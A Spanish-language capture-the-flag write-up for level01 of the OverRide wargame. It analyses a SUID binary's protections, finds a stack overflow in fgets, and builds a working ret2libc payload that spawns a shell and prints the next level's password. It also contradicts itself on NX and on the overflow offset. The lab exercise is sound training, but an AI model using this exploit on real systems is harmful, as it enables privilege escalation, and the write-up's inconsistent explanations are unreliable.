# 1. Buscar Binario:

Listamos los archivos para que muetre el biarnio del `level01` y sus permisos:

```bash
level01@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level01 level01   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level01 level01 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01
-rw-r--r--+ 1 level01 level01   41 Oct 19  2016 .pass
-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile
```

> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level02`).

# 2. Analizamos las protecciones de la RAM
```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

### a). PIE:
```bash
level01@OverRide:~$ file ./level01 
./level01: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x923fd646950abba3d31df70cad30a6a5ab5760e8, not stripped
```

## b). ASLR:
```bash
level01@OverRide:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level01@OverRide:~$ readelf -l ./level01 | grep -E "STACK|RELRO"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
```

### d). STACK CANARY:
```bash
level01@OverRide:~$ nm ./level01 
08049f28 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
0804868c R _IO_stdin_used
         w _Jv_RegisterClasses
08049f18 d __CTOR_END__
08049f14 d __CTOR_LIST__
08049f20 D __DTOR_END__
08049f1c d __DTOR_LIST__
08048898 r __FRAME_END__
08049f24 d __JCR_END__
08049f24 d __JCR_LIST__
0804a01c A __bss_start
0804a014 D __data_start
08048640 t __do_global_ctors_aux
080483e0 t __do_global_dtors_aux
0804a018 D __dso_handle
         w __gmon_start__
08048632 T __i686.get_pc_thunk.bx
08049f14 d __init_array_end
08049f14 d __init_array_start
08048630 T __libc_csu_fini
080485c0 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804a01c A _edata
0804a0a4 A _end
0804866c T _fini
08048688 R _fp_hw
08048318 T _init
080483b0 T _start
0804a040 B a_user_name
0804a024 b completed.6159
0804a014 W data_start
0804a028 b dtor_idx.6161
         U fgets@@GLIBC_2.0
08048440 t frame_dummy
080484d0 T main
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
0804a020 B stdin@@GLIBC_2.0
08048464 T verify_user_name
080484a3 T verify_user_pass
```

### e). `.got` y `.plt`:
```bash
level01@OverRide:~$ readelf -S ./level01 | grep -E ".got|.plt"
  [10] .rel.plt          REL             080482f0 0002f0 000028 08   A  5  12  4
  [12] .plt              PROGBITS        08048350 000350 000060 04  AX  0   0 16
  [22] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049ff4 000ff4 000020 04  WA  0   0  4
```

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000`. |
| **ASLR** | **OFF** | `0` | El Heap y el Stack no se mueven; las direcciones son fijas. |
| **NX** | **OFF** | `RWE` | El Heap  y el Stack SI permiten ejecución.  Podemos meter y correr Shellcode allí. |
| **RELRO** | **PARTIAL** | `R` | La sección `.got.plt` sigue siendo escribible `(WA)`. Podríamos hacer un `GOT Hijack` si fuera necesario. |
| **CANARY** | **NO**  | `No canary found` | No hay "centinela" al final del stack. Podemos desbordar el EIP sin que el programa lo detecte. |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got.plt` en escritura |

# 4. Fuzzing:

Al ejecutar el binairo nos pide un usuario y depués la contraseña. Si concer la contaseña probamos si somos capaces de generar un `segfault`, algo que solo logramos realizar cuando concemos el nombre del usuario. 

El nombre del usuairo lo encontramos desensamblando el bianrio: `"dat_wil"`.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: asdas
verifying username....

nope, incorrect username...

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
asdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
nope, incorrect password...

Segmentation fault (core dumped)
```

Esto nos hace pensar que esta vez si que podremos usar la técnica de `Stack BUffer Overflow` desbordando el buffer.

---

# 5. Reverse Engineering (Target Identification):

1. Desensamblamos `main` y las dos funciones que testean el `nombre de usuario` y `password`.
```asm
0x0804852d <+93>:	call   0x8048464 <verify_user_name>
0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
```

2. Encontramos el nombre de usuario en `<verify_user_name>`:
```bash
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```

3. Encontramos la **vulnerabilidad** de main en la `Línea <+164>`:
```asm
0x08048574 <+164>:	call   0x8048370 <fgets@plt>
``` 
- Aunque usa la función `fgets()` controla el tamaño del string a leer, lee más bytes de los que hay reservados en el buffer.
- En la línea `<+8>` el programa reserva `96 bytes (0x60)` de espacio en el stack.
- El `buffer` del password empieza en [esp+0x1c].
- El fgets de la línea <+164> lee `100 bytes (0x64)`.

4. Por lo tanto, si calculamos `96 − 28 (que es 0x1c) = 68 bytes` de espacio real hasta el final del frame. Al leer 100 bytes, desbordamos el stack por 32 bytes. Suficiente para pisar el EIP (la dirección de retorno).

5. Buscamos `system()` en el binario usando `nm` y no lo encontamos.

6. Tenemos el `NX está activado` no podmeos ejecutar código en el stack. Tenemos que saltar a la librería de `C (libc)` que ya está cargada en memoria.

Para ver con detalle el analisis consuta el archivo  [asm_analysis.md](https://github.com/4trastos/OverRide/blob/main/level01/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/OverRide/blob/main/level01/source.c).

---

# 6. Solución:

Para resolver este nivel, necesitamos construir un exploit de **Ret2Libc**. 

Cuando la función `main` termine (en el `ret` de la línea `<+229>`), el programa no vuelva al sistema, sino que salte a `system()` dentro de la `libc`.

Necesitamos dos direcciones:

1. **Dirección de `system()**` en la Libc.
2. **Dirección de la cadena `"/bin/sh"**` (que también está dentro de la Libc).

Encontrar la dirección de `system()`:

1. **Preparamos el entorno:**

Ponemos un `brake` en el `main` y arrancamos el programa para que la `libc` se mapee en memoria:
```bash
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) r
Starting program: /home/users/level01/level01 
Breakpoint 1, 0x080484d5 in main ()
```

2. **Encontrar la dirección de system:**

Una vez que el porgrama está corriendo, `GDB` puede ver las librerías `0xf7e6aed0`:
```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>  ⟸ 
```

3. **Encontrar la cadena "/bin/sh":**

* Primero necesitamos saber dónde empieza y termina la libc en memoria:

```bash
(gdb) info proc mapping
process 1798
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so       ⟸
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) quit
```
* Ya sabemos que la `libc` está en el rango `0xf7e2c000 - 0xf7fcc000`. 
* Ahora buscamos la cadena ahí mismo:

```bash
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec                                       ⟸
1 pattern found.
```

* system(): `0xf7e6aed0`
* "/bin/sh": `0xf7f897ec`

---

# 7. Cálculo del Offset y construcción del payload:

* El `buffer` del password empieza en `[esp + 0x1c]` (decimal 28).
* El stack total reservado es `sub esp, 0x60` (decimal 96).
* El EBP guardado está justo después de esos 96 bytes.
* El EIP (dirección de retorno) está justo después del EBP (4 bytes más).

Cálculo:

* Desde el inicio del stack hasta el EIP hay `96 (esp) + 4 (ebp) = 100 bytes.`
* El `buffer` empieza en la posición 28.
* `100 − 28 = 80 bytes`.

Construcción:

1. El nombre del usuario: `python -c 'print "dat_wil"';`
2. 80 bytes de relleno para desbordar el `buffer`: `python -c 'print "A"*80 `
3. La dirección del `system()`
4. Los 4 bytes con `"AAAA"` del `Dummy Return`
5. La dirección de `"/bin/sh"`
6. El comando `cat` para mantener la shell abierta y porder escribir comandos.

```bash
(python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```

---

### **Ejecución:**

```bash
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "A"*80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
pwd       
/home/users/level01
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
Segmentation fault (core dumped)
level01@OverRide:~$ su level02
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
level02@OverRide:~$ 
```

# 7. Conclusión:

El nivel 01 aunque usa una función teóricamente segura como `fgets()`, un error en el cálculo del tamaño del buffer por parte del programador permite un `Stack Buffer Overflow`.

Las protecciones de la RAM como `ASLR` y `PIE` están **desactivadas**. Esto nos permite aplicar con éxito la técnica de `Ret2Libc`, desviando la ejecución del programa hacia la librería estándar de C.